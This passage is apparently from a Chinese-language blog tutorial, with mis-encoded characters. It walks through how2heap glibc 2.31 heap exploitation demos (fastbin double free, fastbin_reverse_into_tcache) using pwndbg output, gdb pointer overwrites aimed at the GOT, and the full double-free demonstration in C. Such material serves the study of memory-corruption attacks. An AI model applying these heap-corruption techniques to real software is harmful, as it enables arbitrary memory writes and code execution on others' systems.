class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5555555593a0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rax r8  <span class="number">0x5555555593a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚         <span class="number">0x5555555593b8</span> â—‚â€” <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚         <span class="number">0x5555555593c0</span> â€”â–¸ <span class="number">0x555555559390</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>â”‚         <span class="number">0x5555555593c8</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚         <span class="number">0x5555555593d8</span> â—‚â€” <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"></span><br><span class="line">## ä¿®æ”¹ fd</span><br><span class="line"><span class="built_in">set</span> *<span class="number">0x5555555593c0</span>=<span class="number">0x555555557f78</span></span><br><span class="line">## è®¾ç½®size ç¬¦åˆ fastbiné“¾</span><br><span class="line"><span class="built_in">set</span> *<span class="number">0x555555557f80</span>=<span class="number">0x21</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555593c0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚   <span class="number">0x5555555593c0</span> â€”â–¸ <span class="number">0x555555557f78</span> (_DYNAMIC+<span class="number">488</span>) â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚   <span class="number">0x5555555593c8</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚   <span class="number">0x5555555593d8</span> â—‚â€” <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚   <span class="number">0x5555555593e0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚   <span class="number">0x5555555593f8</span> â—‚â€” <span class="number">0x20c11</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x555555557f78</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚   <span class="number">0x555555557f78</span> (_DYNAMIC+<span class="number">488</span>) â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚   <span class="number">0x555555557f80</span> (_GLOBAL_OFFSET_TABLE_) â—‚â€” <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶fastbin é“¾çš„ç»“æ„å°±ä¼šè¢«ä¿®æ”¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x20</span> [  <span class="number">7</span>]: <span class="number">0x555555559360</span> â€”â–¸ <span class="number">0x555555559340</span> â€”â–¸ <span class="number">0x555555559320</span> â€”â–¸ <span class="number">0x555555559300</span> â€”â–¸ <span class="number">0x5555555592e0</span> â€”â–¸ <span class="number">0x5555555592c0</span> â€”â–¸ <span class="number">0x5555555592a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x5555555593b0</span> â€”â–¸ <span class="number">0x555555557f78</span> (_DYNAMIC+<span class="number">488</span>) â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br></pre></td></tr></table></figure><p>å½“æ‰§è¡Œåˆ° åˆ†é… c chunk çš„æ—¶å€™ ï¼Œæˆ‘ä»¬å°±ä¼šæ‹¿åˆ°ç›®æ ‡å†…å­˜ï¼Œæ€»ç»“ä¸€ä¸‹å°±æ˜¯</p><p>é€šè¿‡ fastbin double free æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤šä¸ªæŒ‡é’ˆæ§åˆ¶åŒä¸€ä¸ªå †å—ï¼Œè¿™å¯ä»¥ç”¨äºç¯¡æ”¹ä¸€äº›å †å—ä¸­çš„å…³é”®æ•°æ®åŸŸæˆ–è€…æ˜¯å®ç°ç±»ä¼¼äºç±»å‹æ··æ·†çš„æ•ˆæœã€‚ å¦‚æœæ›´è¿›ä¸€æ­¥ä¿®æ”¹ fd æŒ‡é’ˆï¼Œåˆ™èƒ½å¤Ÿå®ç°ä»»æ„åœ°å€åˆ†é…å †å—çš„æ•ˆæœ (é¦–å…ˆè¦é€šè¿‡éªŒè¯)ï¼Œè¿™å°±ç›¸å½“äºä»»æ„åœ°å€å†™ä»»æ„å€¼çš„æ•ˆæœã€‚</p><p>å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache first.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">                ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">                <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">        <span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">        a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">        assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-fastbin-reverse-into-tcache"><a href="#2-fastbin-reverse-into-tcache" class="headerlink" title="2. fastbin_reverse_into_tcache"></a>2. fastbin_reverse_into_tcache</h3><p>é¦–å…ˆåˆ†é…ä¸€å®šæ•°é‡çš„ chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">19</span>   <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="number">20</span>   <span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="number">21</span>   <span class="keyword">size_t</span> i;</span><br><span class="line">â–º <span class="number">22</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">  <span class="number">23</span>     ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="number">24</span>   &#125;</span><br></pre></td></tr></table></figure><p>ç„¶å free å¡«å…… tcache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">31</span>   <span class="comment">// Fill the tcache.</span></span><br><span class="line"> â–º <span class="number">32</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">   <span class="number">33</span>     <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">   <span class="number">34</span>   &#125;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">7</span>]: <span class="number">0x555555559480</span> â€”â–¸ <span class="number">0x555555559430</span> â€”â–¸ <span class="number">0x5555555593e0</span> â€”â–¸ <span class="number">0x555555559390</span> â€”â–¸ <span class="number">0x555555559340</span> â€”â–¸ <span class="number">0x5555555592f0</span> â€”â–¸ <span class="number">0x5555555592a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>é‡Šæ”¾æˆ‘ä»¬çš„ç›®æ ‡ chunk å³è¿™é‡Œçš„ ptrs[7]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line"><span class="built_in">printf</span>(</span><br><span class="line">  <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">  <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">  <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">  victim</span><br><span class="line">);</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é‡Šæ”¾å‰©ä¸‹çš„ 8-14 çš„chunk</p><p>ç„¶åå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªå †æº¢å‡ºæ¼æ´ï¼Œå¯ä»¥è¦†ç›– victim çš„å†…å®¹ï¼Œæˆ‘ä»¬æ­¤æ—¶å°† æ ˆä¸Šæ„é€ å¥½çš„ä¸€ä¸ª listçš„åœ°å€èµ‹äºˆ victim </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">75</span>   <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line">   <span class="number">76</span></span><br><span class="line">   <span class="number">77</span>   <span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line"> â–º <span class="number">78</span>   *(<span class="keyword">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line">   <span class="number">79</span></span><br><span class="line">   <span class="number">80</span>   <span class="comment">//------------------------------------</span></span><br><span class="line">  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; p victim</span><br><span class="line">$<span class="number">1</span> = <span class="number">0x5555555594d0</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555594d0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rax  <span class="number">0x5555555594d0</span> â€”â–¸ <span class="number">0x7fffffffe200</span> â—‚â€” <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚      <span class="number">0x5555555594d8</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ malloc 7æ¬¡ æ¸…ç©º tcache bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_reverse_into_tcache.c</span><br><span class="line">   <span class="number">86</span>   <span class="comment">// Empty tcache.</span></span><br><span class="line">   <span class="number">87</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">   <span class="number">88</span>     ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">   <span class="number">89</span>   &#125;</span><br><span class="line">   <span class="number">90</span></span><br><span class="line"> â–º <span class="number">91</span>   <span class="built_in">printf</span>(</span><br><span class="line">   <span class="number">92</span>     <span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line">   <span class="number">93</span>     <span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span></span><br><span class="line">   <span class="number">94</span>   );</span><br><span class="line">   <span class="number">95</span></span><br><span class="line">   <span class="number">96</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rsp  <span class="number">0x7fffffffe1e0</span> â—‚â€” <span class="number">0x34000000340</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚      <span class="number">0x7fffffffe1e8</span> â—‚â€” <span class="number">0x7</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚      <span class="number">0x7fffffffe1f0</span> â€”â–¸ <span class="number">0x5555555594d0</span> â€”â–¸ <span class="number">0x7fffffffe200</span> â—‚â€” <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚      <span class="number">0x7fffffffe1f8</span> â—‚â€” <span class="number">0x100</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚      <span class="number">0x7fffffffe200</span> â—‚â€” <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">... â†“</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f <span class="number">0</span>     <span class="number">55555555540</span>a main+<span class="number">481</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x5555555596a0</span> â€”â–¸ <span class="number">0x555555559650</span> â€”â–¸ <span class="number">0x555555559600</span> â€”â–¸ <span class="number">0x5555555595b0</span> â€”â–¸ <span class="number">0x555555559560</span> â—‚â€” ...</span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å‘ç° fastbin çš„æœ€åä¸€ä¸ªçš„ fdè¢«æˆ‘ä»¬å†™æˆäº† stack çš„åœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x5555555596a0</span> â€”â–¸ <span class="number">0x555555559650</span> â€”â–¸ <span class="number">0x555555559600</span> â€”â–¸ <span class="number">0x5555555595b0</span> â€”â–¸ <span class="number">0x555555559560</span> â—‚â€” ...</span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x555555559560</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚   <span class="number">0x555555559560</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚   <span class="number">0x555555559568</span> â—‚â€” <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚   <span class="number">0x555555559570</span> â€”â–¸ <span class="number">0x555555559510</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚   <span class="number">0x555555559578</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x555555559510</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚   <span class="number">0x555555559510</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚   <span class="number">0x555555559518</span> â—‚â€” <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚   <span class="number">0x555555559520</span> â€”â–¸ <span class="number">0x5555555594c0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚   <span class="number">0x555555559528</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555594c0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚   <span 